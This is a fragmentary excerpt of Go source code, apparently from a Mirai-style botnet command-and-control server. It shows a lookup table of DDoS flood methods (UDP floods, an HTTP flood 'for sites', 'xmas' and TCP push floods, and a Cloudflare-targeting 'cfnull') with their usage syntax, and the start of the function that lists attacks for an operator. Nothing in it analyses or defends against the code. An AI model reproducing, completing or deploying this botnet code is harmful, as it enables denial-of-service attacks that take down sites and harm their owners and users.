...
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    ...
    "udpplain": AttackInfo {
        9,
        []uint8 {0, 1, 7},
        "generic udp flood, less options but more pps",
    },
    "http": AttackInfo {
        10,
        []uint8 {8, 7, 20, 21, 22, 23, 24},
        "http flood (for sites)",
    },
    "ovh2": AttackInfo {
      19,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
	...
	"udphex": AttackInfo {                                                                        
      14,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "udphex [ip] [time] dport=[port] (udp)",
    },    
    "xmas": AttackInfo {
      13,
        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
        "xmas [ip] [time] dport=[port] (tcp)",
    },
	"tcppsh": AttackInfo {                                                                        
      16,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "tcppsh [ip] [time] dport=[port] (tcp)",
    },
	"stdhex": AttackInfo {
      17,
       []uint8 {0, 1, 7},
	...
	"cfnull": AttackInfo {
      21,
        []uint8 {8, 7, 20, 21, 22, 23, 24},
        "cfnull [ip] [time] domain=[ip] conns=[300]",
    },
	"hex": AttackInfo {
       22,
        []uint8 {0, 1, 7},
    ...
    "tcpudp": AttackInfo {
      26,
        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
        "tcpudp [ip] [time] dport=[port] (tcp)",
    },	
	"udppush": AttackInfo {
      27,
        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
        "udppush [ip] [time] dport=[port] (udp)",
    },
	"udpstr": AttackInfo {
      28,
        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
        "udpstr [ip] [time] dport=[port] (udp)",
    },
	"hex2": AttackInfo {
      29,
       []uint8 {0, 1, 7},
...
func NewAttack(str string, admin int) (*Attack, error) {
    ...
    if len(args) == 0 {
        ...
        if args[0] == "?" {
            validCmdList := "\x1b[0;37mAvailable Attack List:\r\n\x1b[0;36m"
